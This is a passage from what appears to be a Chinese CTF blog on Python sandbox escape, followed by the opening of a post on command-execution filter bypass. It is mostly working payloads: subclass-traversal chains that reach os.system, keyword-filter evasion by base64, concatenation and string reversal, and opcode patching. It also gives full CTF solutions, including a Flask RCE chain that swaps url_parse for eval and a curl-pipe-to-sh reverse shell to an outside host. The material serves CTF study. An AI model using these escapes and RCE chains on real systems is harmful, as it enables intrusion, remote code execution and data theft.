['__builtins__'], '_markupbase': ['__builtins__'], '_osx_support': ['os', 'sys', '__builtins__'], '_pydecimal': ['__builtins__'], '_pyio': ['os', 'codecs', 'sys', '__builtins__', 'open'], '_sitebuiltins': ['sys', '__builtins__'], '_strptime': ['__builtins__'], '_threading_local': ['__builtins__'], '_weakrefset': ['__builtins__'], 'abc': ['__builtins__'], 'aifc': ['__builtins__', 'open'], 'antigravity': ['__builtins__'], 'argparse': ['__builtins__'], 'ast': ['__builtins__'], 'asynchat': ['__builtins__'], 'asyncore': ['os', 'sys', '__builtins__'], 'base64': ['__builtins__'], 'bdb': ['os', 'sys', '__builtins__'], 'binhex': ['os', '__builtins__'], 'bisect': ['__builtins__'], 'bz2': ['os', '__builtins__', 'open'], 'cProfile': ['__builtins__'], 'calendar': ['sys', '__builtins__'], 'cgi': ['os', 'sys', '__builtins__'], 'cgitb': ['os', 'sys', '__builtins__'], 'chunk': ['__builtins__'], 'cmd': ['sys', '__builtins__'], 'code': ['sys', '__builtins__'], 'codecs': ['sys', '__builtins__', 'open'], 'codeop': ['__builtins__'], 'colorsys': ['__builtins__'], 'compileall': ['os', 'importlib', 'sys', '__builtins__'], 'configparser': ['os', 'sys', '__builtins__'], 'contextlib': ['sys', '__builtins__'], 'copy': ['__builtins__'], 'copyreg': ['__builtins__'], 'crypt': ['__builtins__'], 'csv': ['__builtins__'], 'datetime': ['__builtins__'], 'decimal': ['__builtins__'], 'difflib': ['__builtins__'], 'dis': ['sys', '__builtins__'], 'doctest': ['os', 'sys', '__builtins__'], 'dummy_threading': ['__builtins__'], 'enum': ['sys', '__builtins__'], 'filecmp': ['os', '__builtins__'], 'fileinput': ['os', 'sys', '__builtins__'], 'fnmatch': ['os', '__builtins__'], 'formatter': ['sys', '__builtins__'], 'fractions': ['sys', '__builtins__'], 'ftplib': ['sys', '__builtins__'], 'functools': ['__builtins__'], 'genericpath': ['os', '__builtins__'], 'getopt': ['os', '__builtins__'], 'getpass': ['os', 'sys', '__builtins__'], 'gettext': ['os', 'sys', '__builtins__'], 'glob': ['os', '__builtins__'], 'gzip': ['os', 'sys', '__builtins__', 'open'], 'hashlib': ['__builtins__'], 'heapq': ['__builtins__'], 'hmac': ['__builtins__'], 'imaplib': ['subprocess', 'sys', '__builtins__'], 'imghdr': ['__builtins__'], 'imp': ['os', 'importlib', 'sys', '__builtins__'], 'inspect': ['os', 'importlib', 'sys', '__builtins__'], 'io': ['__builtins__', 'open'], 'ipaddress': ['__builtins__'], 'keyword': ['__builtins__'], 'linecache': ['os', 'sys', '__builtins__'], 'locale': ['sys', '__builtins__'], 'lzma': ['os', '__builtins__', 'open'], 'macpath': ['os', '__builtins__'], 'macurl2path': ['os', '__builtins__'], 'mailbox': ['os', '__builtins__'], 'mailcap': ['os', '__builtins__'], 'mimetypes': ['os', 'sys', '__builtins__'], 'modulefinder': ['os', 'importlib', 'sys', '__builtins__'], 'netrc': ['os', '__builtins__'], 'nntplib': ['__builtins__'], 'ntpath': ['os', 'sys', '__builtins__'], 'nturl2path': ['__builtins__'], 'numbers': ['__builtins__'], 'opcode': ['__builtins__'], 'operator': ['__builtins__'], 'optparse': ['os', 'sys', '__builtins__'], 'os': ['sys', '__builtins__', 'open'], 'pathlib': ['os', 'sys', '__builtins__'], 'pdb': ['os', 'sys', '__builtins__'], 'pickle': ['codecs', 'sys', '__builtins__'], 'pickletools': ['codecs', 'sys', '__builtins__'], 'pipes': ['os', '__builtins__'], 'pkgutil': ['os', 'importlib', 'sys', '__builtins__'], 'platform': ['os', 'platform', 'subprocess', 'sys', '__builtins__'], 'plistlib': ['os', 'codecs', '__builtins__'], 'poplib': ['__builtins__'], 'posixpath': ['os', 'sys', '__builtins__'], 'pprint': ['__builtins__'], 'profile': ['os', 'sys', '__builtins__'], 'pstats': ['os', 'sys', '__builtins__'], 'pty': ['os', 'sys', '__builtins__'], 'py_compile': ['os', 'importlib', 'sys', '__builtins__', 'compile'], 'pyclbr': ['importlib', 'sys', '__builtins__'], 'pydoc': ['os', 'platform', 'importlib', 'sys', '__builtins__'], 'queue': ['__builtins__'], 'quopri': ['__builtins__'], 'random': ['__builtins__'], 're': ['__builtins__', 'compile'], 'reprlib': ['__builtins__'], 'rlcompleter': ['__builtins__'], 'runpy': ['importlib', 'sys', '__builtins__'], 'sched': ['__builtins__'], 'secrets': ['os', '__builtins__'], 'selectors': ['sys', '__builtins__'], 'shelve': ['__builtins__', 'open'], 'shlex': ['os', 'sys', '__builtins__'], 'shutil': ['os', 'sys', '__builtins__'], 'signal': ['__builtins__'], 'site': ['os', 'sys', '__builtins__'], 'smtpd': ['os', 'sys', '__builtins__'], 'smtplib': ['sys', '__builtins__'], 'sndhdr': ['__builtins__'], 'socket': ['os', 'sys', '__builtins__'], 'socketserver': ['os', 'sys', '__builtins__'], 'sre_compile': ['__builtins__', 'compile'], 'sre_constants': ['__builtins__'], 'sre_parse': ['__builtins__'], 'ssl': ['os', 'sys', '__builtins__'], 'stat': ['__builtins__'], 'statistics': ['__builtins__'], 'string': ['__builtins__'], 'stringprep': ['__builtins__'], 'struct': ['__builtins__'], 'subprocess': ['os', 'sys', '__builtins__'], 'sunau': ['__builtins__', 'open'], 'symbol': ['__builtins__'], 'symtable': ['__builtins__'], 'sysconfig': ['os', 'sys', '__builtins__'], 'tabnanny': ['os', 'sys', '__builtins__'], 'tarfile': ['os', 'sys', '__builtins__', 'open'], 'telnetlib': ['sys', '__builtins__'], 'tempfile': ['__builtins__'], 'textwrap': ['__builtins__'], 'this': ['__builtins__'], 'threading': ['__builtins__'], 'timeit': ['timeit', 'sys', '__builtins__'], 'token': ['__builtins__'], 'tokenize': ['sys', '__builtins__', 'open'], 'trace': ['os', 'sys', '__builtins__'], 'traceback': ['sys', '__builtins__'], 'tracemalloc': ['os', '__builtins__'], 'tty': ['os', '__builtins__'], 'turtle': ['sys', '__builtins__'], 'types': ['__builtins__'], 'typing': ['sys', '__builtins__'], 'uu': ['os', 'sys', '__builtins__'], 'uuid': ['os', 'sys', '__builtins__'], 'warnings': ['sys', '__builtins__'], 'wave': ['sys', '__builtins__', 'open'], 'weakref': ['sys', '__builtins__'], 'webbrowser': ['os', 'subprocess', 'sys', '__builtins__', 'open'], 'xdrlib': ['__builtins__'], 'zipapp': ['os', 'sys', '__builtins__'], 'zipfile': ['os', 'importlib', 'sys', '__builtins__']&#125;target_modules = ['os', 'platform', 'subprocess', 'timeit', 'importlib', 'codecs', 'sys']target_functions = ['__import__', '__builtins__', 'exec', 'eval', 'execfile', 'compile', 'file', 'open']all_targets = list(set(list(find_modules.keys()) + target_modules + target_functions))all_modules = list(set(list(find_modules.keys()) + target_modules))subclasses = ().__class__.__bases__[0].__subclasses__()sub_name = [s.__name__ for s in subclasses]# 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()print('----------1-----------')for i, s in enumerate(sub_name): for f in all_targets: if f == s: if f in target_functions: print(i, f) elif f in all_modules: target = find_modules[f] sub_dict = subclasses[i].__dict__ for t in target: if t in sub_dict: print(i, f, target)print('----------2-----------')# 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')for i, sub in enumerate(subclasses): try: more = sub.__init__.__globals__ for m in all_targets: if m in more: print(i, sub, m, find_modules.get(m)) except Exception as e: passprint('----------3-----------')# 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__(\"os\").system(\"ls\")')for i, sub in enumerate(subclasses): try: more = sub.__init__.__globals__.values() for j, v in enumerate(more): for f in all_targets: try: if f in v: if f in target_functions: print(i, j, sub, f) elif f in all_modules: target = find_modules.get(f) sub_dict = v[f].__dict__ for t in target: if t in sub_dict: print(i, j, sub, f, target) except Exception as e: pass except Exception as e: passprint('----------4-----------')# 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__'](\"os\").system(\"ls\")# &lt;class 'warnings.catch_warnings'&gt;类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似for i, sub in enumerate(subclasses): try: more = sub()._module.__builtins__ for f in all_targets: if f in more: print(i, f) except Exception as e: pass 代码执行 python2 123456789101112131415161718192021 # 利用file()函数读取文件：（写类似）().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()# 执行系统命令：().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].os.system('ls')# 执行系统命令：().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").system(\"ls\")')# 重新载入__builtins__：().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__'](\"os\").system(\"ls\")#读文件().__class__.__bases__[0].__subclasses__()[40](r'C:\\1.php').read()#写文件().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')#执行任意命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls /var/www/html\").read()' )# 利用 __getattibute__ 方法x = [x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'ca'+'tch_warnings'][0].__init__x.__getattribute__(\"func_global\"+\"s\")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s') python3python3各个小版本之间有区别，有的payload可以用于py3.7 有的可以用于py3.5 12345678().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__['system']('ls')().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[\"sys\"].modules[\"os\"].system(\"ls\")''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[\"sys\"].modules[\"os\"].system(\"ls\")[].__class__.__base__.__subclasses__()[127].__init__.__globals__['system']('ls')[].__class__.__base__.__subclasses__()[-4].__init__.__globals__['system']('dir') import限制与绕过import 导入所以说如果导入的模块a中有着另一个模块b，那么，我们可以用a.b的方法或者a.__dict__[b&lt;name&gt;]的方法间接访问模块b 例子1 123456import re,syspattern = re.compile('import\\s+(os|subprocess)')match = re.search(pattern,sys.args[1])if match: print \"forbidden module import detected\" raise Exception 要执行shell命令,必须引入 os/commands/subprocess这几个包,对于攻击者来说,改如何绕过呢, 必须使用其他的引入方式 12__import__函数 #动态加载类和函数importlib库 __import__函数 12test = __import__(\"os\")print test.system('whoami') importlib库 123import importlibtest= importlib.import_module(\"os\")print(test.system(\"whoami\")) 还可以使用编码的方式绕过对导入包关键字的检查，比如使用base64，python2中适用 12345678910&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64encode(\"os\")'b3M='&gt;&gt;&gt; flag = __import__(base64.b64decode('b3M='))&gt;&gt;&gt; flag.system('whoami')misaki\\user&gt;&gt;&gt; import importlib&gt;&gt;&gt; flag = importlib.import_module('b3M='.decode('base64'))&gt;&gt;&gt; flag.system('whoami')misaki\\user 或者使用字符串拼接的方式 1&gt;&gt;&gt; __import__('o'+'s').system('who'+'ami') 字符串f翻转截取 1234&gt;&gt;&gt; __import__('so'[::-1]).system('whoami')misaki\\user&gt;&gt;&gt; exec(')\"imaohw\"(metsys.so ;so tropmi'[::-1])misaki\\user 例子2 123456import re,syspattern = re.compile('import')match = re.search(pattern,sys.args[1])if match: print \"forbidden module import detected\" raise Exception 使用execfile，不过在这之前需要判断得到库的物理路径。如果sys模块没被禁用的话，就可以使用sys来获取物理路径。这种方式只能用在python2中，python3取消了execfile 123&gt;&gt;&gt; execfile(&#39;&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;os.py&#39;) #Linux系统下默认路径&gt;&gt;&gt; system(&#39;whoami&#39;)misaki python3可以利用读取文件，配合exec来执行 1234&gt;&gt;&gt; f &#x3D; open(r&#39;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;os.py&#39;,&#39;r&#39;)&gt;&gt;&gt; exec(f.read())&gt;&gt;&gt; system(&#39;whoami&#39;)misaki #不可以执行利用exec打开读取，exec需要执行的是其中的内容，直接打开的时候exec执行的就是读取文件操作exec(“open(‘/usr/lib/python3.6/os.py’,’r’).read()”)使用with open的形式 12345&gt;&gt;&gt; with open(&#39;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;os.py&#39;,&#39;r&#39;) as f:... exec(f.read())...&gt;&gt;&gt; system(&#39;whoami&#39;)misaki 或者使用字符串拼接的方式，但是需要跟exec，eval一起利用。 12&gt;&gt;&gt; exec('imp'+'ort'+' '+'os;'+'os.system(\"whoami\")')misaki\\user builtin在python中,我们知道,不用引入直接使用的内置函数称为 builtin 函数,随着__builtin__这一个module 自动被引入到环境中(在python3.x 版本中,__builtin__变成了builtins,而且需要引入) 因此,open(),int(),chr()这些函数,就相当于 123__builtin__.open()__builtin__.int()__builtin__.chr() 如果我们把这些函数从builtin中删除,那么就不能够再直接使用了 123456&gt;&gt;&gt; import __builtin__&gt;&gt;&gt; del __builtin__.chr&gt;&gt;&gt; chr(1)Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;NameError: name &#39;chr&#39; is not defined 同样,刚才的__import__函数,同样也是一个builtin函数,同样,常用的危险函数eval,exec,execfile也是__builtin__的,因此只要从__builtin__中删除这些东西,那么就不能再去使用了 __builtin__和 __builtins__之间是什么关系呢？ 1、在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。 2、非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身 *解决办法: * __builtins__是一个默认引入的module对于模块,有一个函数reload用于重新从文件系统中的代码来载入模块 因此我们只需要 1reload(__builtins__) 就可以重新得到完整的__builtins__模块了 但是,reload也是__builtins__下面的函数,如果直接把它干掉,就没办法重新引入了 但可以使用 12import impimp.reload(__builtins__) 其他特殊函数通过上面的一些绕过姿势我们发现，无外乎是利用 subclasses 中的一些特殊的方法或者模块然后来调用一些函数或者模块来读取文件，或者执行命令，那么我们可以遍历所有的系统库，然后找到所有的使用了os等模块的模块，然后遍历 subclasses 列表，找到所有可以绕过的姿势查找方式，详情可看此篇文章Python沙箱逃逸总结 OpCode利用OpCode绕过Python沙箱 opcode又称为操作码，是将python源代码进行编译之后的结果，python虚拟机无法直接执行human-readable的源代码，因此python编译器第一步先将源代码进行编译，以此得到opcode。例如在执行python程序时一般会先生成一个pyc文件，pyc文件就是编译后的结果，其中含有opcode序列。 1234567import disdef a(): if 1 == 2: print(\"flag&#123;****&#125;\")opcode=a.__code__.co_code.encode('hex')print \"Opcode of a():\",opcodeprint dis.dis(opcode.decode('hex')) result: 1234567891011Opcode of a(): 6401006402006b020072140064030047486e000064000053 0 LOAD_CONST 1 (1) 3 LOAD_CONST 2 (2) 6 COMPARE_OP 2 (&#x3D;&#x3D;) 9 POP_JUMP_IF_FALSE 20 12 LOAD_CONST 3 (3) 15 PRINT_ITEM 16 PRINT_NEWLINE 17 JUMP_FORWARD 0 (to 20) &gt;&gt; 20 LOAD_CONST 0 (0) 23 RETURN_VALUE 为了进一步研究OpCode，我们可以对dis的disassemble_string函数进行patch 在124行加入 1print hex(op).ljust(6), 可以查看具体的字节码。 1234567891011Opcode of a(): 6401006402006b020072140064030047486e000064000053 0 LOAD_CONST 0x64 1 (1) 3 LOAD_CONST 0x64 2 (2) 6 COMPARE_OP 0x6b 2 (&#x3D;&#x3D;) 9 POP_JUMP_IF_FALSE 0x72 20 12 LOAD_CONST 0x64 3 (3) 15 PRINT_ITEM 0x47 16 PRINT_NEWLINE 0x48 17 JUMP_FORWARD 0x6e 0 (to 20) &gt;&gt; 20 LOAD_CONST 0x64 0 (0) 23 RETURN_VALUE 0x53 指令名 操作 LOAD_GLOBAL 读取全局变量 STORE_GLOBAL 给全局变量赋值 LOAD_FAST 读取局部变量 STORE_FAST 给局部变量赋值 LOAD_CONST 读取常量 POP_JUMP_IF_FALSE 当条件为假的时候跳转 JUMP_FORWARD 直接跳转 例题 1 123def a(): if 1 == 2: print(\"flag&#123;****&#125;\") sulution1直接获取a.__code__.co_consts，查看所有的常量。即可知道flag 1(None, 1, 2, &#39;flag&#123;****&#125;&#39;) sulution2更改程序运行逻辑CodeType构造函数 123def __init__(self, argcount, nlocals, stacksize, flags, code, consts, names, varnames, filename, name, firstlineno, lnotab, freevars&#x3D;None, cellvars&#x3D;None): 上述函数其余参数均可通过__code.__.co_xxx获得因此我们 123456def a(): if 1 &#x3D;&#x3D; 2: print(&quot;flag&#123;****&#125;&quot;)for name in dir(a.__code__): print name,getattr(a.__code__,name) 输出 123456789101112131415co_argcount 0co_cellvars ()co_code ddkrdGHndSco_consts (None, 1, 2, &#39;flag&#123;****&#125;&#39;)co_filename example1.pyco_firstlineno 1co_flags 67co_freevars ()co_lnotab co_name aco_names ()co_nlocals 0co_stacksize 2co_varnames () 构造相应目标代码 12345def a(): if 1 !&#x3D; 2: print(&quot;flag&#123;****&#125;&quot;)print &quot;Opcode of a():&quot;,a.__code__.co_code.encode(&#39;hex&#39;) 得到code 16401006402006b030072140064030047486e000064000053 构造payload 12345678910def a(): if 1 &#x3D;&#x3D; 2: print(&quot;flag&#123;****&#125;&quot;)newcode &#x3D; type(a.__code__)code &#x3D; &quot;6401006402006b030072140064030047486e000064000053&quot;.decode(&#39;hex&#39;)code &#x3D; newcode(0,0,2,67,code,(None, 1, 2, &#39;flag&#123;****&#125;&#39;),(),(),&quot;xxx&quot;,&quot;a&quot;,1,&quot;&quot;)a.__code__ &#x3D; codea() 即可输出flag 过滤绕过过滤__globals__当__globals__被禁用时， 可以用func_globals直接替换； 使用__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;) 1234567# 原型是调用__globals__''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc')# 如果过滤了__globals__，可直接替换为func_globals''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['__builtins__']['__import__']('os').system('calc')# 也可以通过拼接字符串得到方式绕过''.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(\"__glo\"+\"bals__\")['__builtins__']['__import__']('os').system('calc') 过滤global1&#123;&#123;&quot;&quot;.__class__.__mro__[2].__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&quot;ls&quot;).read()&#125;&#125; base64编码对关键字进行base64编码可绕过一些明文检测机制：1234567&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64encode('__import__')'X19pbXBvcnRfXw=='&gt;&gt;&gt; base64.b64encode('os')'b3M='&gt;&gt;&gt; __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).system('calc')0 reload()方法某些情况下，通过del将一些模块的某些方法给删除掉了，但是我们可以通过reload()函数重新加载该模块，从而可以调用删除掉的可利用的方法： 1234567891011&gt;&gt;&gt; __builtins__.__dict__['eval']&lt;built-in function eval&gt;&gt;&gt;&gt; del __builtins__.__dict__['eval']&gt;&gt;&gt; __builtins__.__dict__['eval']Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;KeyError: 'eval'&gt;&gt;&gt; reload(__builtins__)&lt;module '__builtin__' (built-in)&gt;&gt;&gt;&gt; __builtins__.__dict__['eval']&lt;built-in function eval 字符串拼接凡是以字符串形式作为参数的都可以使用拼接的形式来绕过特定关键字的检测。 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__bu&#39;+&#39;iltins__&#39;][&#39;__impor&#39;+&#39;t__&#39;](&#39;o&#39;+&#39;s&#39;).system(&#39;ca&#39;+&#39;lc&#39;) 过滤中括号当中括号[]被过滤掉时， 调用__getitem__()函数直接替换； 调用pop()函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换； 12345678# 原型''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc')# __getitem__()替换中括号[]''.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__('__builtins__').__getitem__('__import__')('os').system('calc')# pop()替换中括号[]，结合__getitem__()利用''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.__globals__.pop('__builtins__').pop('__import__')('os').system('calc') ctf例题examp11234567891011121314151617181920212223242526272829303132from __future__ import print_functionbanned = [ \"import\", \"exec\", \"eval\", \"pickle\", \"os\", \"subprocess\", \"kevin sucks\", \"input\", \"banned\", \"cry sum more\", \"sys\"]targets = __builtins__.__dict__.keys()print(targets)targets.remove('raw_input')targets.remove('print')for x in targets: del __builtins__.__dict__[x]while 1: try: print(\"&gt;&gt;&gt;\", end=' ') data = raw_input() for no in banned: if no.lower() in data.lower(): print(\"No bueno\") break else: # this means nobreak exec data except: print(\"error\") 这道题目运行在python2.7的环境，虽然没有删除reload，但是利用了黑名单机制，即使你重新载入builtins，也不能成功使用删除的危险函数。file 文件读取 12().__class__.__bases__[0].__subclasses__()[40]('./flag.txt').read()# 等价于 open('test.py').read() 调用其他类中的OS模块完成命令执行 123456789class 'warnings.catch_warnings'# 在这个类中，调用了os模块，我们可以间接把os模块调用进来。# win 32().__class__.__bases__[0].__subclasses__()[54]# linux 2().__class__.__bases__[0].__subclasses__()[59]# linux 2 print(().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls'))# func_globals:返回一个包含函数全局变量的字典引用； examp2pysandbox SCTF2020 123456789101112131415161718from flask import Flask, requestapp = Flask(__name__)@app.route('/', methods=[\"POST\"])def security(): secret = request.form[\"cmd\"] print(secret) for i in secret: if not 42 &lt;= ord(i) &lt;= 122: return \"error!\" exec(secret) return \"xXXxXXx\"if __name__ == '__main__': app.run(host=\"0.0.0.0\") solution1: 置静态目录的做法 123&#x2F;?POST&#x3D;%2fcmd&#x3D;app.static_folder&#x3D;request.args[request.method] 设置静态目录为/之后即可访问static/flag solution2:__builtins__是python的内建函数的内建命名空间，dir看一下有ord 将其改写为lambda匿名函数，先覆盖ord，让其返回42-122之间的数即可，确保不会error 1__builtins__.__dict__[&#39;ord&#39;] &#x3D; lambda args:42 但是过滤了空格和引号，空格可以用 *args 代替。 123post &#x2F; __builtins__.ord&#x3D;lambda*args:45 然后再将路由函数覆盖掉 123post /cmd=app.view_functions['security'] = lambda: __import__('os').popen('cat ./flag').read() 不过此做法，如果其他人也在做题，不管其请求什么，同时也会得到flag 所以可以反弹shell 1cmd&#x3D;__import__(&quot;os&quot;).popen(&quot;curl -d &#96;&#x2F;readflag&#96; vps:port&quot;).read() solution3:[TokyoWesterns 2018 shrine writeup](TokyoWesterns 2018 shrine writeup)本 题 的 主 要 思 路 就 是 劫 持 函 数 ， 通 过 替 换 某 一 个 函 数 为 eval system等 ， 然 后 变 量 外 部 可 控 ，即 可 RCE看 了 一 下 大 家 RCE的 做 法 都 不 相 同 ， 但 只 要 是 劫 持 都 算 在 预 期 内 ， 只 是 链 不 一 样 ， 这 里 就 只贴 一 下 自 己 当 时 挖 到 的 方 法 了首 先 要 找 到 一 个合 适 的 函 数 ， 满 足 参 数 可 控 ， 最 终 找 到 werkzeug.urls.url_parse这 个 函 数 ， 参数 就 是 HTTP包 的 路 径比 如 1234GET &#x2F;index.php HTTP&#x2F;1.1Host: xxxxxxxxxxxxxUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko&#x2F;20100101Firefox&#x2F;77.0 参 数 就 是 ‘/index.php’然 后 是 劫 持 ， 我 们 无 法 输 入 任 何 括 号 和 空 格 ， 所 以 无 法 直 接 import werkzeug需 要 通 过 一 个 继 承 链 关 系 来 找 到 werkzeug这 个 类直 接 拿 出 tokyowestern 2018年 shrine的 找 继 承 链 脚 本（ https://eviloh.github.io/2018/09/03/TokyoWesterns-2018-shrine-writeup/)访 问 一 下 ， 即 可 在 1.txt最 下 面 看 到 继 承 链最 终 找 到 是 1request.__class__._get_current_object.__globals__[&#39;__loader__&#39;].__class__.__weakref__.__objclass__.contents.__globals__[&#39;__loader__&#39;].exec_module.__globals__[&#39;_bootstrap_external&#39;]._bootstrap.sys.modules[&#39;werkzeug.urls&#39;] 但 是 发 现 我 们 不 能 输 入 任 何 引 号 ， 这 个 考 点 也 考 多 了 ， 可 以 通 过 request的 属 性 进 行 bypass一 些 外 部 可 控 的 request属 性 1234567891011121314151617181920212223242526request.hostrequest.content_md5request.content_encoding所 以 请 求 1POST &#x2F; HTTP&#x2F;1.1Host: __loader__User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko&#x2F;20100101Firefox&#x2F;77.0Accept:text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateConnection: closeCookie:experimentation_subject_id&#x3D;IjA3OWUxNDU0LTdiNmItNDhmZS05N2VmLWYyY2UyM2RmZDEyMyI%3D--a3effd8812fc6133bcea4317b16268364ab67abb; lang&#x3D;zh-CNUpgrade-Insecure-Requests: 1Cache-Control: max-age&#x3D;0Content-MD5: _bootstrap_externalContent-Encoding: werkzeug.urlsContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 246cmd&#x3D;request.__class__._get_current_object.__globals__[request.host].__class__.__weakref__.__objclass__.contents.__globals__[request.host].exec_module.__globals__[request.content_md5]._bootstrap.sys.modules[request.content_encoding].url_parse&#x3D;eval 然 后 url_parse函 数 就 变 成 了 eval然 后 访 问 第 二 个 请 求 1234567891011121314151617181920212223POST __import__(&#39;os&#39;).system(&#39;curl$&#123;IFS&#125;https:&#x2F;&#x2F;shell.now.sh&#x2F;8.8.8.8:1003|sh&#39;)HTTP&#x2F;1.1Host: __loader__User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko&#x2F;20100101Firefox&#x2F;77.0Accept:text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateConnection: closeCookie:experimentation_subject_id&#x3D;IjA3OWUxNDU0LTdiNmItNDhmZS05N2VmLWYyY2UyM2RmZDEyMyI%3D--a3effd8812fc6133bcea4317b16268364ab67abb; lang&#x3D;zh-CNUpgrade-Insecure-Requests: 1Cache-Control: max-age&#x3D;0Content-MD5: _bootstrap_externalContent-Encoding: werkzeug.urlsContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 246cmd&#x3D;request.__class__._get_current_object.__globals__[request.host].__class__.__weakref__.__objclass__.contents.__globals__[request.host].exec_module.__globals__[request.content_md5]._bootstrap.sys.modules[request.content_encoding].url_parse&#x3D;eval 参考文章:python 沙箱逃逸与SSTIPython 沙箱逃逸Python的方法解析顺序Bypass Python sandboxesPython沙箱逃逸的n种姿势用python继承链搞事情Python沙箱逃逸总结利用OpCode绕过Python沙箱从一个CTF题目学习Python沙箱逃逸Python沙箱逃逸小结","categories":[],"tags":[]},{"title":"命令执行及绕过","slug":"CTF的命令执行及绕过","date":"2020-07-06T08:30:00.000Z","updated":"2021-05-12T16:35:16.665Z","comments":true,"path":"article/e6a569f4.html","link":"","permalink":"https://blog.cfyqy.com/article/e6a569f4.html","excerpt":"详情可看如下两篇浅谈CTF中命令执行与绕过的小技巧命令执行的一些绕过技巧","text":"详情可看如下两篇浅谈CTF中命令执行与绕过的小技巧命令执行的一些绕过技巧 linux下的命令查看文件12345678910111213cat 由第一行开始显示内容，并将所有内容输出tac 从最后一行倒序显示内容，并将所有内容输出more 根据窗口大小，一页一页的现实文件内容less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符head 只显示头几行tail 只显示最后几行nl 类似于cat -n，显示时输出行号tailf 类似于tail -f od 指令会读取所给予的文件的内容，并将其内容以八进制字码呈现出来sort 将文本文件内容加以排序rev 命令将文件中的每行内容以字符为单位反序输出strings 打印文件中可打印的字符cut -f 1 filename 从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出 查找文件1234find . -name &quot;fla*&quot; locate fla* locate 命令无需指定路径，直接搜索即可.而是在一个叫 mlocate.db 的数据库下搜索。这个数据库位于 &#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db ，它包含了系统里所有文件的索引，并且会在每天早上的时候由 cron 工具自动更新一次,可以 sudo updadb 更新其数据库 which 命令主要用来查找可执行文件的位置 whereis 命令会在系统默认安装目录(一般是有root权限时默认安装的软件)查找二进制文件、源码、文档中包含给定查询关键词的文件。 寻找文件内容1grep -ar fla* &#x2F; -a不忽略二进制文件 文件传输1234567curl 利用curl下载文件。#使用内置option：-o(小写)# curl -o dodo1.jpg http:www.linux.com&#x2F;dodo1.JPG#使用内置option：-O（大写)# curl -O http:&#x2F;&#x2F;www.linux.com&#x2F;dodo1.JPG 列目录1ls dir 命令分隔符 %0a符号 换行符 %0d符号 回车符 ;符号 在 shell 中，担任”连续指令”功能的符号就是”分号” &amp;符号 &amp; 放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。进程切换到后台的时候，我们把它称为job。切换到后台时会输出相关job信息 |符号 管道符左边命令的输出就会作为管道符右边命令的输入，所以左边的输出并不显示 